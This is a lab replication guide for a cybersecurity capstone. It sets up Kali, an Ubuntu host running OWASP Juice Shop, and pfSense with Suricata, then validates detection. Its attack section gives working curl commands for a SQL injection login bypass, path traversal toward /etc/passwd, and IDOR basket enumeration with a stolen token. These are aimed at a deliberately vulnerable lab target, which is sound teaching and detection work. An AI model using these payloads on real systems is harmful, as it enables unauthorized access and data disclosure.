---
layout: default
title: "Resume"
---

# Lab Replication Guide

## Overview

This guide walks you through replicating the complete Attack-Defend Lifecycle capstone in your own lab environment.

---

## System Requirements

### Host Machine
- **OS**: macOS, Linux, or Windows with Hyper-V
- **Virtualization**: VMware, VirtualBox, UTM, or Hyper-V
- **Minimum RAM**: 16 GB (8 GB minimum for basic setup)
- **Disk Space**: 80 GB free (3 VMs × ~20-30 GB each)

### Virtual Machines Required

1. **Kali Linux 2023** (ARM64 or x86_64)
   - CPU: 2 cores
   - RAM: 4 GB
   - Disk: 20 GB
   - Role: Attacker workstation

2. **Ubuntu 22.04 LTS** (x86_64)
   - CPU: 2 cores
   - RAM: 4 GB
   - Disk: 20 GB
   - Role: Target server (runs OWASP Juice Shop via Docker)

3. **pfSense 2.8.1** (x86_64)
   - CPU: 2 cores
   - RAM: 2 GB
   - Disk: 10 GB
   - Role: Firewall + IDS (runs Suricata)

---

## Network Configuration

### Three-Zone Architecture

```
┌─────────────────────────────────────┐
│           WAN ZONE                  │
│  (Upstream Internet - Disconnected) │
└──────────────┬──────────────────────┘
               │
        ┌──────▼──────┐
        │   pfSense   │
        │  (Firewall) │
        │  (Suricata) │
        └──────┬──────┘
               │
        ┌──────▼──────────────────┐
        │   LAN ZONE (192.168.1.0/24) │
        │                         │
        ├─ Kali (192.168.1.105)   │
        ├─ Ubuntu (192.168.1.110) │
        └─────────────────────────┘
```

### IP Addressing

| Device | IP Address | VLAN | Role |
|--------|-----------|------|------|
| pfSense LAN | 192.168.1.1 | 1 | Gateway/Firewall |
| Kali | 192.168.1.105 | 1 | Attacker |
| Ubuntu | 192.168.1.110 | 1 | Target |

### Network Adapter Configuration

All three VMs must be on **Bridged networking** (or equivalent for your hypervisor):
- Allows VM-to-VM communication
- Enables firewall traffic inspection
- Creates a single LAN segment

---

## Installation Steps

### Step 1: Deploy Kali Linux

1. Download Kali Linux 2023 ISO from [kali.org](https://www.kali.org/get-kali/)
2. Create new VM with specs above
3. Install with default settings
4. Set hostname: `kali`
5. Configure network for Bridged mode

**Post-Install**:
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install curl jq vim git -y
```

### Step 2: Deploy Ubuntu 22.04

1. Download Ubuntu 22.04 LTS ISO from [ubuntu.com](https://ubuntu.com/download/server)
2. Create new VM with specs above
3. Install with default settings (enable OpenSSH)
4. Set hostname: `ubuntu`
5. Configure network for Bridged mode

**Post-Install - Set Static IP**:
```bash
sudo nano /etc/netplan/00-installer-config.yaml
```

Replace with:
```yaml
network:
  version: 2
  ethernets:
    eth0:
      dhcp4: no
      addresses: [192.168.1.110/24]
      gateway4: 192.168.1.1
      nameservers:
        addresses: [8.8.8.8, 8.8.4.4]
```

Apply:
```bash
sudo netplan apply
```

**Install Docker & Juice Shop**:
```bash
sudo apt install docker.io -y
sudo docker run -d -p 3000:3000 bkimminich/juice-shop
```

Verify:
```bash
curl http://localhost:3000
```

### Step 3: Deploy pfSense

1. Download pfSense 2.8.1 from [pfsense.org](https://www.pfsense.org/download/)
2. Create new VM with specs above
3. During installation:
   - LAN interface: `em0` (or first adapter)
   - Configure LAN IP: `192.168.1.1/24`
   - DHCP server: Enable
   - WAN interface: Configure secondary (can be DHCP from host)
4. Access web UI: `https://192.168.1.1`
   - Default username: `admin`
   - Default password: `pfsense`

**Change Password**:
1. Login to web UI
2. System → User Manager → admin → Change Password
3. Set strong password

### Step 4: Install Suricata on pfSense

1. In pfSense web UI: **System → Packages**
2. Search for "suricata"
3. Click **Install**
4. Wait for installation (5-10 minutes)

**Configure Suricata**:
1. **Services → Suricata → Interfaces**
2. Click **"+"** to add interface
3. Select **LAN (em0)**
4. Enable: "Enable Suricata"
5. Click **Save**

**Wait for interface to start** (may take 1-2 minutes)

### Step 5: Load Detection Rules

1. Go to **Services → Suricata → LAN → LAN Rules**
2. Paste the five rules from `rules/local.rules` into the text area
3. Click **Save**
4. Suricata will reload

**Verify Rules Loaded**:
1. Go to **Services → Suricata → LAN**
2. Status should show "Running"
3. Rules count should reflect your custom rules

---

## Network Connectivity Validation

From Kali terminal, verify the lab:

```bash
# Check your IP
ip a | grep "inet 192"
# Should show: inet 192.168.1.105/24

# Test gateway
ping -c 3 192.168.1.1
# Should get responses

# Test Ubuntu
ping -c 3 192.168.1.110
# Should get responses

# Test Juice Shop
curl http://192.168.1.110:3000
# Should return HTML
```

If all three work ✓, your lab is ready.

---

## Executing the Attacks

### Attack 1: SQL Injection

From Kali:

```bash
# Create payload
cat > sqli_payload.json << 'EOF'
{"email": "' OR 1=1--", "password": "anything"}
EOF

# Execute attack
curl -X POST http://192.168.1.110:3000/rest/user/login \
  -H "Content-Type: application/json" \
  --data-binary @sqli_payload.json | jq
```

**Expected Response**:
```json
{"authentication":{"token":"eyJ0eXAi..."}}
```

### Attack 2: Path Traversal

From Kali:

```bash
# Baseline (legitimate request)
curl http://192.168.1.110:3000/ftp/legal.md

# Obfuscation bypass
curl "http://192.168.1.110:3000/ftp/....//....//....//....//etc/passwd"
```

**Expected**: Second request returns "Only .md and .pdf files are allowed!" (filter was bypassed, whitelist held)

### Attack 3: IDOR

From Kali:

```bash
# Get token
TOKEN=$(curl -s -X POST http://192.168.1.110:3000/rest/user/login \
  -H "Content-Type: application/json" \
  --data-binary @sqli_payload.json | jq -r '.authentication.token')

# Enumerate baskets
curl -H "Authorization: Bearer $TOKEN" \
  http://192.168.1.110:3000/rest/basket/1 | jq '.data | {id, UserId}'

curl -H "Authorization: Bearer $TOKEN" \
  http://192.168.1.110:3000/rest/basket/2 | jq '.data | {id, UserId}'

curl -H "Authorization: Bearer $TOKEN" \
  http://192.168.1.110:3000/rest/basket/3 | jq '.data | {id, UserId}'
```

**Expected**: Different UserId values for each basket (broken access control)

---

## Capturing Evidence

### With Wireshark

1. On Kali, install Wireshark: `sudo apt install wireshark -y`
2. Start packet capture on LAN interface
3. Run attacks (see above)
4. Export HTTP streams:
   - Right-click packet → Follow → HTTP Stream
   - File → Export as PDF or screenshot
5. Save evidence for documentation

### With tcpdump

Alternative to Wireshark:

```bash
# From Kali, capture traffic
sudo tcpdump -i eth0 -w capstone.pcap host 192.168.1.110

# Run attacks in separate terminal
# Ctrl+C to stop capture

# View in Wireshark
wireshark capstone.pcap
```

---

## Validating Detection

### Check Suricata Alerts

1. In pfSense web UI: **Services → Suricata → LAN → Alerts**
2. Click **Refresh**
3. Look for alerts with SID 1000001–1000005

**Note**: If alerts don't appear due to platform constraints, use Wireshark evidence as backup (documented in [DETECTION.md](DETECTION.md))

### Correlate Traffic & Alerts

1. Capture pcap (tcpdump or Wireshark)
2. Note packet timestamps
3. Check Suricata alert timestamps
4. Match: attack packet time ≈ alert timestamp
5. Verify: alert message contains expected content (e.g., "OR 1=1")

---

## Troubleshooting

### "No route to host"
- Verify all VMs are on Bridged networking
- Check pfSense LAN interface is UP
- Restart networking: `sudo systemctl restart networking` (on Kali/Ubuntu)

### Juice Shop not responding
- SSH to Ubuntu: `ssh ubuntu@192.168.1.110`
- Check Docker: `docker ps`
- If not running: `docker run -d -p 3000:3000 bkimminich/juice-shop`
- Wait 15 seconds, try curl again

### Suricata rules won't load
- Check syntax: Each rule must end with `;`
- Verify SID is unique (1000001-1000005 in this project)
- Check pfSense logs: **System → Logs → System**

### Ubuntu IP keeps changing
- Configure static IP (see Step 2 above)
- Apply: `sudo netplan apply`
- Verify: `ip a | grep 192.168.1.110`

---

## Lab Teardown

When finished:

1. **Stop VMs** (don't delete)
2. **Shutdown Suricata**: Services → Suricata → Stop
3. **Export evidence**: Screenshots, pcaps, logs
4. **Archive VM snapshots**: For future reference

To restart lab:
1. Boot all three VMs in order: pfSense → Ubuntu → Kali
2. Verify connectivity: `ping 192.168.1.1; ping 192.168.1.110`
3. Re-run attacks or load pcaps

---

## Next Steps

Once lab is running:

1. Follow **[ATTACKS.md](ATTACKS.md)** for detailed attack walkthroughs
2. Review **[DETECTION.md](DETECTION.md)** to understand rule engineering
3. Study **rules/local.rules** for inline comments
4. Examine Wireshark captures for packet-level understanding

---

## Additional Resources

- [Kali Linux Documentation](https://www.kali.org/docs/)
- [Ubuntu Server Guide](https://ubuntu.com/server/docs)
- [pfSense Documentation](https://docs.netgate.com/pfsense/)
- [Suricata Rule Writing Guide](https://docs.suricata.io/en/latest/rules/)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)

---

**Last Updated**: August 2, 2026  
**Tested On**: macOS (Apple Silicon M1), UTM 4.x  
**Time to Complete**: 2-4 hours (depending on VM provisioning speed)
